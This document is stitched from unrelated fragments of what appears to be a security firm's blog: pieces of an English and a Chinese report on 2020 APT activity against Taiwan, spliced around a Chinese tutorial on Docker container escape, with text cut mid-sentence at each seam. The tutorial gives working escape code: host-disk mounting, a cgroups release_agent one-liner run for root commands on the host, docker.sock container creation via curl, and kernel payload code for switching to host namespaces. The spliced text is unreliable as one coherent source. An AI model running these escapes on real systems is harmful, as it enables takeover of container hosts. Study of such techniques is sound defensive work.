Chinese authority in their thirteen and fourteen Five-Year projects. Cyber espionage was also adopted as a mean to improve their techniques. Healthcare and transportation are also two industries that got coveted by APT actors. As we mentioned in the previous paragraph, COVID-19 could be an incentive for APT actors to attack Healthcare industries. Lastly, we would like to raise a phenomenon TeamT5 observed: There was an adversary group which we called GouShe (a.k.a TroppicTropper, Keyboy) focus on infiltrating Transportation related entities in Taiwan. More than 70% of transportation related cases we observed were from this specific group.\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 APT target industries distribution_\n\n\u003cbr\u003e\n\nTeamT5 has tracked activities from at least 9 APT groups and 8 of them are from China. HUAPI (a.k.a BlackTech/PLEAD) was definitely the most ambitious group in Taiwan. Their attacks counts around 30% of incidents we analyzed and the targeting scope includes almost all the industries we listed. The supply chain attacks we mentioned in previous paragraphs were also conducted by them. APT27 (a.k.a EmissaryPanda, IronTiger, LuckyMouse, BronzeUnion), GouShe and AMOEBA (a.k.a APT41, Barium, Winnti) are groups that are quite active in 2020. APT27 was mostly attacking government, healthcare, and financial entities. GouShe showed a peculiar interest in transportation related entities while their footprints are also observed in energy and government entities. TeamT5 has tracked this group for many years. Our research shows that the actors might bear some responsibility from their higher commands to monitor some critical infrastructure facilities in Taiwan and take control of them in case of emergency status.\n\nAMOEBA attacked energy companies, semiconductor companies, educational institutes, and IT companies. Their primary goal appears to be more for intellectual property or secret theft. But the possibilities exist that the actor might further leverage their achievement, like what they did in the ransom-attack in May. SLIME1, SLIME9 and SLIME13 are temporary code names for three Chinese APT campaigns against Taiwan that have lasted for a few years. Their activities still continued in 2020. Polaris (a.k.a MustangPanda) is another Chinese APT group that attacked almost all neighboring countries of China. We intercepted several of their spear phishing emails against government and research institutes in early stage of COVID-19 and we surmise they were gathering for information related to pandemic. One last interesting discovery: we discovered some Linux based malware used by Lazarus, a notorious North Korean APT group, circulated in Taiwan but we are unable to obtain the victim identity information. Although Taiwan is not a primary target of North Korean APT. But the Lazarus actors are believed to bear financial supporting responsibilities for their government agencies. For example, Lazarus is believed to be the culprit behind a Taiwanese bank SWIFT heist in 2017 [4]. The sample we uncovered might suggest their activities still exist in Taiwan.\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_Adversaries attacking Taiwan in 2020_\n\n\u003cbr\u003e\n\n### Conclusion\n\nThe purpose of this article is to provide a high-level overview of APT threat landscape of Taiwan in 2020, since TeamT5 believes knowing your enemy is the first step of effective defense. TeamT5 research shows that APT attacks keep evolving to become very complex and impossible for a security product to defend.

Changes to the global resource are visible to other processes that are members of the namespace, but are invisible to other processes.  One use of namespaces is to implement containers.\n\n這邊的「資源」（resource）指的就像 Mount point 或 PID，Namespaces 可以建立一個獨立的 Mount point 或 PID，讓 Container 僅能存取自己掛載的檔案系統或自己的 Process，與 Host 隔離開來，不會弄亂 Host 的檔案，或存取到 Host 的 Process 資訊。\n\n使用 Namespaces 的方式就是呼叫 `unshare`、`setns`、`clone` 等 System call，類別也不只有 Mount 與 PID，詳細可以看 [Man page](https://man7.org/linux/man-pages/man7/namespaces.7.html)。\n\n### Cgroups\n\nCgroups 透過 `cgroupfs` 控制 Process 所能使用的記憶體容量或 CPU 資源，讓 Process 不會因為一些 bug 讓整台電腦當機，Docker 可以用 `--cpu-shares` 來限制各個 Container 能用到的 CPU 資源。詳細請見 [Cgroups man page](https://man7.org/linux/man-pages/man7/cgroups.7.html)。\n\n### Seccomp\nSeccomp (Secure Computing) 對 CTFer 可能不陌生，用來限制能夠使用的 System call，常見於一些 Shellcode 題。\n\nContainer 很常禁用 `mount` ，因為它是一個方便我們逃離 Container 的 System call，接下來就會說明如何利用 `mount` 逃出 Container。詳細請見 [Seccomp man page](https://man7.org/linux/man-pages/man2/seccomp.2.html)。\n\n### Capabilities\n\nCapabilities 從 Linux Kernel 2.2 開始加入，目的是將權限做更細緻的區隔，以 Container 來說，若直接給它 `root` 權限是不安全的，這意味著它可以隨意載入 Kernel module 或 `mount`，讓 Container 有機會存取 Host 資源，因此 Container 內的 `root` 只有一些基本的 Capabilities，如 CAP\\_CHOWN、CAP\\_KILL、CAP\\_SETUID、CAP\\_SETGID 等。Ubuntu 使用者可以安裝 `libcap2-bin` 並使用 `getpcaps {pid}` 查看該 Process 擁有哪些 Capabilities，詳細請看 [man page](https://man7.org/linux/man-pages/man7/capabilities.7.html)。\n\n### LSM (Linux Security Module)\n\nLinux kernel 文件裡寫道：\n\n\u003e The primary users of the LSM interface are Mandatory Access Control (MAC) extensions which provide a comprehensive security policy.\n\n如 AppArmor 和 SELinux 都是 Linux Kernel 內建的 Security Module，透過它們專屬的設定檔可以限制 Process 的存取權限，像 Docker 就是使用 AppArmor 限制 `procfs` 以及 `mount`，保護 Host 資源。\n\n### OverlayFS\n\n許多 Container 使用 OverlayFS 當作它的檔案系統，如它的名字，目的就是要把兩個或多個檔案系統合併，讓它看起來是一個檔案系統。它使用了 `upper` 與 `lower` 區分兩種要合併的檔案系統，其中若 `upper` 與 `lower` 有相同檔案時，會以 `upper` 為主。我們用 Container 來解釋，Docker 把 `upper` 當作 Container layer、`lower` 當作 Image layer，我們在 `docker build` 的時候會產生 Image，利用這些 Image 我們可以很快地產出 Container，在 Image 內的檔案如 Ubuntu 預設的系統檔案就會被放在 Image layer，在 Container runtime 產生的檔案，例如 Log 檔會被放在 Container layer，這麼一來建立多個 Container 時可以讓它們的 Image layer 都是同一個，省下許多空間。\n\n來實驗一下，首先開兩個 Container：\n\n```\n$ docker run --name t1 -it ubuntu\nroot@e937832abc06:/#\n```\n\n```\n$ docker run --name t2 -it ubuntu\nroot@71c8a58e90ac:/#\n```\n\n檢查它們的 LowerDir：\n\n```\n$ docker inspect t1 | grep Lower\n                \"LowerDir\": ...:/var/lib/docker/overlay2/07a2cbd7...dbdf/diff:...,\n$ docker inspect t2 | grep Lower\n                \"LowerDir\": ...:/var/lib/docker/overlay2/07a2cbd7...dbdf/diff:...,\n```\n\n仔細一看，列出來的路徑幾乎是一樣的，接下來看看裡面有什麼：\n\n```\n$ sudo ls -alF /var/lib/docker/overlay2/07a2cbd7...dbdf/diff\ntotal 24\ndrwxr-xr-x 6 root root 4096 Nov 13  2019 ./\ndrwx------ 4 root root 4096 Nov 13  2019 ../\ndrwxr-xr-x 4 root root 4096 Nov  1  2019 etc/\ndrwxr-xr-x 2 root root 4096 Nov  1  2019 sbin/\ndrwxr-xr-x 3 root root 4096 Oct 30  2019 usr/\ndrwxr-xr-x 3 root root 4096 Oct 30  2019 var/\n```\n\n是很常見的系統資料夾！也就是 Image layer，接下來看 Container layer：\n\n```\nroot@e937832abc06:/# echo 'hello, host' \u003e /hello\n```\n\n先在 Container 內創立一個檔案：\n\n```\n$ docker inspect e937 | grep Upper\n                \"UpperDir\": \"/var/lib/docker/overlay2/657597a...a966/diff\",\n$ sudo cat /var/lib/docker/overlay2/657597a...a966/diff/hello\nhello, host\n```\n\n然後用 `docker inspect` 找到 UpperDir，就會看到我們建立的 `hello` 檔案了！\n\n\u003cbr/\u003e\n\n## Container Escape\n來試想一個情境，有一台主機遵守 Microservices 的精神，使用 Docker 分別架設了網站、資料庫與郵件伺服器這三個 Container，假設郵件伺服器存在漏洞被駭客入侵，也不會直接影響到網站和資料庫，維護的工程師也能很快的用 Docker 換成新版本來進行即時修補。但如果 Container 存在漏洞時，所有的服務都有可能陷入風險。\n\n### Privileged Container\n我們先從比較容易 Escape 的 Privileged Container 開始，Privileged Container 沒有 Seccomp 限制且 Capability 全開，讓 Container 可以存取所有硬體設備，為的就是讓這個 Container 有獨立的環境且能做 Host 能做的事。Docker 建立 Privileged container 的方法很簡單，只要在 `dokcer run` 時多加個 `--privileged` flag 即可。\n\n`docker run --privileged -it ubuntu`\n\n另外還有一個很棒的功能，用 Docker 跑 Docker。聽起來很奇怪但很合理，如果去看 Docker 的[開發文件](https://github.com/docker/docker-ce/blob/master/components/engine/docs/contributing/set-up-dev-env.md)，會發現 Docker 是用 Docker 開發的。\n\n一般來說開發用的 Privileged container 駭客碰不到，但如果是用 Docker 架設 CI/CD 工具，然後使用這些工具的 Docker 功能呢？歡迎參考[這篇](https://www.slideshare.net/Docker/build-publish-deploy-and-test-docker-images-and-containers-with-jenkins-workflow)的 \"How Can You Use Jenkins \u0026 Docker Together\"。\n\n沒錯，你需要一個 Privileged container 來運行 CI/CD 工具！接下來先以 Privileged container 為例，說明在我們打下有漏洞的 CI/CD 工具且有 `root` 權限後，要怎麼控制 Host。\n\n#### Mount root\n第一個要介紹的是這個一直被針對的 `mount` ，在 Privileged container 裡是可以直接使用的，來看看如何透過它存取 Host 檔案。\n\n首先先取得 Block device 的 Major 與 Minor：\n\n```\nroot@997453a4062f:/test# ls -alF /sys/dev/block/ | grep sda1\nlrwxrwxrwx 1 root root 0 Aug 12 06:50 8:1 -\u003e ../../devices/pci0000:00/0000:00:01.1/ata1/host0/target0:0:0/0:0:0:0/block/sda/sda1/\n```\n\n`sda1` 是 Host 的根目錄（不同的電腦可能不一樣，對駭客來說可以全部都試試看）。接下來用 `mknod` 產 Block special file 然後 `mount`，就會把 Host 的根目錄放在 Container 內了（若 `/dev/sda1` 不存在才需要使用 `mknod`）。\n\nDocker:\n\n```\nroot@997453a4062f:/test# mknod /dev/myroot b 8 1\nroot@997453a4062f:/test# mkdir rootfs; mount /dev/myroot rootfs\nroot@997453a4062f:/test# echo hello, host! \u003e rootfs/hello\n```\n\nHost:\n\n```\nroot@escape:/# cat /hello\nhello, host!\n```\n\n#### Cgroups v1 release notification\n\n只能存取 `root` 資料夾還不夠！我們的目標是能在 Host 上做任何事且不受 Container 影響。接下來要介紹的是 [Felix Wilhelm 在 Twitter 上寫的](https://twitter.com/_fel1x/status/1151487051986087936)：\n\n\u003e Quick and dirty way to get out of a privileged k8s pod or docker container by using cgroups release_agent feature.\n\n```\nd=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`\nmkdir -p $d/w;echo 1 \u003e$d/w/notify_on_release\nt=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\ntouch /o; echo $t/c \u003e$d/release_agent;echo \"#!/bin/sh\n$1 \u003e$t/o\" \u003e/c;chmod +x /c;sh -c \"echo 0 \u003e$d/w/cgroup.procs\";sleep 1;cat /o\n```\n\n直接用 Docker 跑跑看：\n\n```\n$ docker run --privileged -it ubuntu\nroot@acf8f56c9de6:/test# cat \u003e exp.sh\nd=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`\nmkdir -p $d/w;echo 1 \u003e$d/w/notify_on_release\nt=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\ntouch /o; echo $t/c \u003e$d/release_agent;echo \"#!/bin/sh\n$1 \u003e$t/o\" \u003e/c;chmod +x /c;sh -c \"echo 0 \u003e$d/w/cgroup.procs\";sleep 1;cat /o\nroot@acf8f56c9de6:/test# chmod +x ./exp.sh\nroot@acf8f56c9de6:/test# ./exp.sh ps\n  PID TTY          TIME CMD\n    1 ?        00:01:31 systemd\n    2 ?

    00:00:00 idle_inject/1\n   17 ?        00:00:03 migration/1\n   18 ?        00:00:05 ksoftirqd/1\n   20 ?        00:00:00 kworker/1:0H-ev\n   ...\nroot@acf8f56c9de6:/test# ./exp.sh id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n太棒了！可以在 Container 外執行任意指令且是 `root` 權限。接下來分析它怎麼做到的：\n\n```\nroot@acf8f56c9de6:/test# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`\nroot@acf8f56c9de6:/test# echo $d\n/sys/fs/cgroup/rdma\n```\n\n`d` 變數的目的是取得 Cgroups 底下有 `release_agent` 檔案的路徑，`release_agent` 的描述可參考 [Man page](https://man7.org/linux/man-pages/man7/cgroups.7.html)：\n\n\u003e A special file in the root directory of each cgroup hierarchy, release_agent, can be used to register the pathname of a program that may be invoked when a cgroup in the hierarchy becomes empty.\n\n變為空的意思：\n\n\u003e A cgroup is considered to be empty when it contains no child cgroups and no member processes.\n\n`release_agent` 一般用來讓使用者自訂腳本，清理新建的 Cgroups 讓 `cgroupfs` 保持乾淨，而它會在 Host 以 `root` 權限執行，所以只要能控制 `release_agent`，我們就可以在 Container 外執行任意指令。\n\n在 Cgroups 資料夾底下創立一個 `w` 資料夾，會讓 Cgroups 創立一個新的群組，然後啟用這個群組的 `notify_on_release`：\n\n```\nmkdir -p $d/w;echo 1 \u003e$d/w/notify_on_release\n```\n\n`t` 變數是找出 Host 可以直接看到 Container 檔案的路徑，也就是 OverlayFS 的 UpperDir (Container layer) ，以便 `release_agent` 能夠呼叫 Container 內的惡意腳本：\n\n```\nt=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\n```\n\n最後一步把 `release_agent` 指到我們能控制的惡意腳本，然後利用 `echo 0 \u003e $d/w/cgroup.procs` 把 `echo` 加入 `w` 這個 Cgroups，待 `echo` 結束後就會觸發 `notify_on_release` 然後呼叫 `release_agent`：\n\n```\ntouch /o; echo $t/c \u003e$d/release_agent;echo \"#!/bin/sh\n$1 \u003e$t/o\" \u003e/c;chmod +x /c;sh -c \"echo 0 \u003e$d/w/cgroup.procs\";sleep 1;cat /o\n```\n\n可以發現我們主要用到的功能是 Cgroups 以及 `mount`，因此這個利用方式有個修訂版本，只要使用 `docker run -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash` 就可以利用較少的權限 Escape，詳細可以看[這篇文章](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)。\n\n[![asciicast](https://asciinema.org/a/356357.svg)](https://asciinema.org/a/356357)\n\n#### Exposed docker.sock\n\n用 Docker 跑 Docker 的方式還有這個：\n\n```\ndocker run -v /var/run/docker.sock:/var/run/docker.sock\n```\n\n`dockerd` 開啟後預設會在 `/var/run/docker.sock` 聽取命令，等待使用者送出 Docker 指令後，`docker-cli` 會把指令轉成一定的格式跟 `docker.sock` 溝通，所以把這個檔案映射到 Container 內，等同於讓這個 Container 能夠用 Host 的名義建立 Container。\n\n我們可以簡單的使用 `curl` 控制 `docker.sock`：\n\n```\n$ curl -XPOST --unix-socket /var/run/docker.sock -d '{\"Image\":\"ubuntu\", \"Privileged\":true}' -H 'Content-Type: application/json' http://localhost/containers/create\n{\"Id\":\"8e89909670942daa92999f337fb325b4a89f6a2dd2f5fcf9e972ca089c5b751a\",\"Warnings\":[]}\n$ curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/8e89909670942daa92999f337fb325b4a89f6a2dd2f5fcf9e972ca089c5b751a/start\n```\n\n只要對 `docker.sock` 發送請求就能創立一個 Container！可以用上面的方法開啟一個 Privileged container，再利用前面的手法拿到 Host 控制權！\n\n\u003cbr/\u003e\n\n### Container Engine bug\n\n不過一般的服務如郵件伺服器，它不需要用 Docker 跑 Docker 的功能，也就不會以 `--privileged` 的方式運行，所以就算利用漏洞拿到 Container 的 `root` 權限，也不能用 `mount` 或 `docker.sock` 的方式 Escape，但如果 Container Engine 本身有漏洞，就有機會利用它控制 Host。\n\n#### runC CVE-2019-5736\n\n第一個要介紹的是 runC (run container)，它是一個根據 OCI 規範用來運行 Container 的程式，被許多 Container engine 呼叫，例如：Docker、Kubernets、LXC 等，因此這個漏洞影響範圍相當大（[詳細受影響清單](https://www.cvedetails.com/cve/CVE-2019-5736/)）。而攻擊條件是駭客在 Container 內有 `root` 權限，或 Container Engine 執行了惡意的 Container。\n\n它的漏洞原因在於，新的 Process 若是 `/proc/self/exe`，就能利用殘留的 File descriptor 改寫 runC 這隻程式，等到下次有人使用 Docker 時就會執行被改寫的 runC，而 Docker 是用 `root` 權限運行的，因此就獲得了 `root` 的任意命令執行！\n\n先來看 Process 在正常狀況下是如何被放進 Container。在執行 `docker exec` 的時候 runC 會把自己放進 Container 的 Namespace 然後再 `execve(\"binary\")`：\n\n![Blog_9-6](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-6_2c8cdf52db.png)\n\n但 Process 若指定成 `/proc/self/exe` 就會指回 runC 本身：\n\n![Blog_9-7](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544713/Blog_9-7_011278ad04.png)\n\n有趣的事情發生了！runC 執行 `execve(\"/proc/self/exe\")`，也就是再跑了一次 runC，但用的 Library 是 Container 內的 Library，所以我們可以改寫 Container 內的 `libc` 或 `libseccomp` 之類的 runC 會用到的 Dynamic library，執行任意的程式碼！\n\n![Blog_9-8](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-8_2620f0f070.png)\n\n有任意程式碼執行後重複開啟 `/proc/self/exe`，就能存取 Host 的 runC 程式，但在 Linux 裡執行中的程式是不能被修改的，所以先用 `open` 的 `O_PATH` 模式留下 File descriptor，但不開啟檔案然後 `fork` 讓子程序對 runC 寫入惡意指令，接下來只要等待下一次的 `docker exec` 就會觸發惡意指令！\n\n![Blog_9-9](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-9_fb31bbc0f3.png)\n\n這個漏洞是 CTF 隊伍 Dragon Sector 打完比賽後獲得靈感而研究出來的漏洞，詳細的挖掘過程在他們的[部落格](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)，以及他們的 [Exploit Code](https://www.openwall.com/lists/oss-security/2019/02/13/3)。\n\n[![asciicast](https://asciinema.org/a/356360.svg)](https://asciinema.org/a/356360)\n\n\u003cbr/\u003e\n\n#### rkt CVE-2019-10144/CVE-2019-10145/CVE-2019-10147\n\nrkt 也是一個 Container engine，但已經沒有在維護了，所以這三個 CVE 到現在還是可以利用，不過利用條件較為嚴苛，駭客需要控制由 `rkt enter` 開啟的 Process 才能 Escape（一般狀況下會以 `rkt run` 的方式開啟）。\n\n`rkt enter` 就像是 `docker exec`，可以在指定的 Container 內執行程式，但使用 `rkt enter` 執行的程式擁有所有的 Capabilities ，沒有 Seccomp 限制也沒有隔離 Cgroups。就像個 Privileged Container！\n\n所以使用 `getpcaps $$` 看到所有 Capabilities 的話，恭喜你，你處在一個可以 Container Escape 的環境內！\n\n來看看利用方法，首先下載最新版的 rkt：\n\n```\nwget https://github.com/rkt/rkt/releases/download/v1.30.0/rkt-v1.30.0.tar.gz\ntar xzvf rkt-v1.30.0.tar.gz\ncd rkt-v1.30.0\n./rkt help\n```\n\n用 `getpcaps` 檢查看看：\n\n```\n$ sudo ./rkt --insecure-options=image --interactive=true  run docker://libpcap/libpcap\nroot@rkt-9354bcca-e188-453f-942c-6c1ae056ef70:/# getpcaps $$\nCapabilities for `6': =

./rkt enter 9354 /bin/bash\nroot@rkt-9354bcca-e188-453f-942c-6c1ae056ef70:/# getpcaps $$\nCapabilities for `14': = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_rｆaw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+ep\n```\n\n使用 `rkt enter` 開啟的 `bash` 有 `cap_sys_admin`，可以試著用之前說到的 `mount` 方法存取 Host 的檔案！\n\n但這裡會遇到一些問題，`mknod` 出來的 Block special file 放的位置會影響能不能 `mount`，所以這邊用一個改良的做法：\n\n```\n# mkdir mydev\n# mkdir rootfs\n# mount -t devtmpfs none mydev\n# mount mydev/sda1 rootfs\n```\n\n直接 `mount` 一個型態為 devtmpfs 的資料夾， Linux kernel 就會自動把所有的 Device file 準備好，我們只要 `mount mydev/sda1` 就能存取 Host 的根目錄！\n\n\u003cbr/\u003e\n\n### Linux kernel exploit\n\n前面講到的 Privileged container 以及 Container Engine bug 需要在 Container 內有 `root` 權限，但並不是每個服務都是以 `root` 權限運行，例如 HTTP server 通常會以較低權限的使用者如 `www-data` 身份執行，聰明的你一定注意到了，利用 Linux kernel exploit 獲得 `root` 權限然後再 Escape！\n\n其實，有 Linux kernel exploit 的話可以直接 Escape！Container 用到的 Namespaces、Cgroups 等都是由 Linux kernel 提供的功能，所以如果在 Kernel space 內改寫相關結構，再跳回 User space，就能控制 Host，而且也不需要 Container 的漏洞！\n\n讓我們看看 Linux kernel 內管理 Process 的結構 [`task_struct`](https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L818)\n\n```clike=\nstruct task_struct {\n\t/* ... */\n\t/*\n\t * Pointers to the (original) parent process, youngest child, younger sibling,\n\t * older sibling, respectively.  (p-\u003efather can be replaced with\n\t * p-\u003ereal_parent-\u003epid)\n\t */\n\t\n\t/* Real parent process: */\n\tstruct task_struct __rcu\t*real_parent;\n\t\n\t/* Recipient of SIGCHLD, wait4() reports: */\n\tstruct task_struct __rcu\t*parent;\n\t/* ... */\n\t/* Filesystem information: */\n\tstruct fs_struct\t\t*fs;\n\t/* ... */\n}\n```\n\n裡面有一個 [`fs_struct`](https://elixir.bootlin.com/linux/latest/source/include/linux/fs_struct.h#L9)，再往裡面看看：\n\n```clike=\nstruct fs_struct {\n\tint users;\n\tspinlock_t lock;\n\tseqcount_t seq;\n\tint umask;\n\tint in_exec;\n\tstruct path root, pwd;\n} __randomize_layout;\n```\n\n`task_struct-\u003efs` 存放著這個 Process 的 `root` 以及工作目錄，而我們能夠用 `task_struct-\u003ereal_parent` 取得 Parent process 的 `task_struct`，所以我們可以不斷的往上找，直到找到 `PID = 1`，也就是位於 Host 的 Init process，然後把它的 `fs_struct` 複製給自己，就可以存取 Host 的根目錄了！\n\n![Blog_9-12](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-12_97ea7b5407.png)\n\n這個 Exploit 取自 Nick Freeman 的文章  [An Exercise in Practical Container Escapology](https://capsule8.com/blog/practical-container-escape-exercise/)，他修改了由 Andrey Konovalov 寫的 Linux Kernel exploit，讓它可以 Escape container：\n\n```clike=\ntypedef unsigned long __attribute__((regparm(3))) (*_copy_fs_struct)(unsigned long init_task);\n\nuint64_t get_task(void) {\n    uint64_t task;\n    asm volatile (\"movq %%gs: 0xD380, %0\":\"=r\"(task));\n    return task;\n}\n\nvoid get_root(void) {\n\n    int i;\n    char *task;\n    char *init;\n    uint32_t pid = 0;\n\n\n\t((_commit_creds)(COMMIT_CREDS))(\n\t    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));\n\n\n    task = (char *)get_task();\n    init = task;\n    while (pid != 1) {\n        init = *(char **)(init + TASK_REAL_PARENT_OFFSET);\n        pid = *(uint32_t *)(init + TASK_PID_OFFSET);\n    }\n\n  \n    *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(*(long unsigned int *)(init + TASK_FS_OFFSET));\n}\n```\n\n每個 Linux kernel exploit 都會有一行：\n\n```\n\t((_commit_creds)(COMMIT_CREDS))(\n\t    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));\n```\n\n用途是建立擁有所有權限的 Credentials 並使用它，也就是讓這個 Process 變成 `root` 權限。而這個 Exploit 就是在它之後加上：\n\n```clike\n    task = (char *)get_task();\n    init = task;\n    while (pid != 1) {\n        init = *(char **)(init + TASK_REAL_PARENT_OFFSET);\n        pid = *(uint32_t *)(init + TASK_PID_OFFSET);\n    }\n\n  \n    *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(*(long unsigned int *)(init + TASK_FS_OFFSET));\n```\n\n用 `while` 迴圈找到 Init process，然後呼叫 `copy_fs_struct` 把 `fs_struct` 複製回來，就能看到 Host 的根目錄。\n\n[![asciicast](https://asciinema.org/a/356361.svg)](https://asciinema.org/a/356361)\n\n但還沒結束！我們實際上還沒繞過 Namespaces 的限制，如果使用 `kill` 是會失敗的：\n\n```\nubuntu@ubuntu:/$ ./poc\n[^] starting\n[=] running KASLR defeat exploit (CVE-2017-18344)\n[0] enumerating divide_error() location (CVE-2017-18344)\n[\u003e] setting up proc reader\n...\n[+] done, should be root now\n[6] checking if we got root\n[+] got r00t ^_^\nroot@ubuntu:/# ps aux | grep cat\nuser     22522  0.0  0.0   7444   680 pts/1    S+   17:34   0:00 cat\nroot     22547  0.0  0.0  11288   924 pts/3    S+   17:35   0:00 grep --color=auto cat\nroot@ubuntu:/# kill 22522\nbash: kill: (22522) - No such process\n```\n\n但也足夠了，可以用 Docker 執行 Privileged container 再 Escape。或是 Nick Freeman 提供的作法：\n\n\u003e * Write or overwrite host or other container files (including kubelet configs)\n\u003e * Interact with Docker (perhaps pull and launch a new fun privileged container)\n\u003e * Inject code or harvest data from processes (host or container) via /proc/pid/mem\n\u003e * Load/ unload kernel modules\n\n\u003cbr/\u003e\n\n這麼一來就可以不用花費力氣在換 Namespaces 上，但也有一篇文章提到更換 Namespaces 的方法 [The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)：\n\n```clike=\nvoid get_root_payload( void) {\n\n        ((_commit_creds)(COMMIT_CREDS))(\n                ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0)\n        );\n\n        // -------- NAMESPACE DOCKER EXPLOIT  --------\n        // copy nsproxy from init_nsproxy to pid 1 of the container\n        unsigned long long g = ((_find_task_vpid)(FIND_TASK))(1);\n\n        // now, do the magic.... !!!! Simple black magic doesn't work on current process!!!!\n        ((_switch_task_namespaces)(SWITCH_TASK_NS))(( void *)g, (void *)INIT_NSPROXY);\n\n        // prepare the two namespace FDs by opening the respective files\n        long fd = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, \"/proc/1/ns/mnt\", O_RDONLY, 0);\n        ((_sys_setns)(SYS_SETNS))( fd, 0);\n\n        fd      = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, \"/proc/1/ns/pid\", O_RDONLY, 0);\n        ((_sys_setns)(SYS_SETNS))( fd, 0);\n}\n```\n\n這篇的作法是開啟 `/proc/1/ns/` 資料夾下的檔案，也就是 Namesapces 提供的各個部件（這邊選擇 `mnt` 與 `pid`），然後呼叫 `setns` 把自己的 Namespaces 設定成跟 Host 一樣，這樣就不用額外的步驟，可以直接存取 Host！\n\n\u003cbr/\u003e\n\n## Mitigation\n\n上述說到的 Privileged container 是最容易 Escape 的 Container ，若一定得使用它開服務的話，要把它當作 Host 的服務看待，做好權限管理，只要駭客沒有足夠的權限（ `root` ），就不能使用 `mount` 的方式存取 Host 資源，大幅降低它所造成的危害。Docker 可以用 `docker run -u {uid}:{gid}`，以較低的使用者權限開啟 Container，然後把要開啟的服務放在一般使用者可用的 `port \u003e= 1024` 上，這麼一來就算駭客打下服務，也沒有足夠的權限使用 `mount` 做進一步的攻擊：\n\n```\n# docker run --privileged -it -u 1000 python bash\nI have no name!@6b6f0f0bc93d:/$ python -m http.server 8080 \u0026\n[1] 7\nI have no

年被公認為充滿混亂與災禍的一年。各式各樣的大事件諸如新冠肺炎、中亞東歐台海等地的地緣政治衝突、英國脫歐、美國總統大選都將世界各地的人們帶向跟過去截然不同的生活。TeamT5 在過去一年中持續幫助受到國家力量支持的針對性攻擊行動（或稱 APT 攻擊）所受害的單位。同時間 TeamT5 的威脅情資團隊也主動追蹤 APT 攻擊者的各類行蹤。跟真實世界相比較，網路世界的混亂情況並不亞於我們於現實世界所見，同時網路世界的衝突有很大一部份是真實世界的映射或延伸。本篇文章將探討 TeamT5 在 2020 年所觀察到的台灣威脅態勢。\n\n在本篇文章中，我們首先會為您介紹我們在 2020 年所觀察到的重大趨勢，包含了：\n\n- APT 攻擊的演進，網路間諜不再是唯一的攻擊手段\n- 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n- 由新冠肺炎所引發的網路攻擊\n\n接著我們會針對所觀察到的攻擊行動進行分析，試圖以產業別以及攻擊族群視角來進行網路威脅情資的剖析。文章的最後則是我們對如何應對網路攻擊不斷變化的建議作為總結。\n\n\u003cbr\u003e\n\n### 網路間諜不再是唯一的攻擊手段\n\n2020 年所公開的網路攻擊中，影響最深遠的當數中國 APT 攻擊者於五月時針對多個能源產業公司所進行的勒索軟體攻擊 [1]。TeamT5 研究顯示，這是一個來自中國惡名昭彰的 APT 攻擊族群，規畫已久的攻擊行動。這個行動究竟是攻擊者單純以獲取金錢為目的所發起的勒索行動，抑或是以勒索軟體為掩護的政治嚇阻行動（時值 520 台灣總統上任前），背後的答案依舊成謎。無論如何，本次的攻擊行為已為中國對台 APT 攻擊行動劃下新的里程碑：中國 APT 已針對台灣進行二十年以上的攻擊，但行動範圍都維持在竊取機密為目的而進行的網路間諜行動，這次攻擊意味著攻擊者將開始採用更多元的戰術來對台灣進行網路打擊行動。\n\n另一個發生在 PTT BBS 論壇上的攻擊行動可以佐證我們的臆測：在 2020 年七月，TeamT5 追蹤了一連串的 BBS 爆料貼文，試圖詆毀台灣政府與軍方的形象，攻擊者使用了多個境外跳板 IP 位址來試圖隱藏他們的來源，然而 TeamT5 的情資資料庫顯示，其中一個來源 IP 曾被某個鎖定台灣已久的 APT 攻擊族群所使用；無獨有偶，我們也獲得某訊息來源指出，該 APT 族群正是隱身在此次行動背後的攻擊者。我們相信這兩個事件正是一個警訊，告訴我們中國 APT 族群正在嘗試各種過去沒使用過的手法來做更多樣性的攻擊行動。\n\n\u003cbr\u003e\n\n### 供應鏈攻擊成為 2020 年 APT 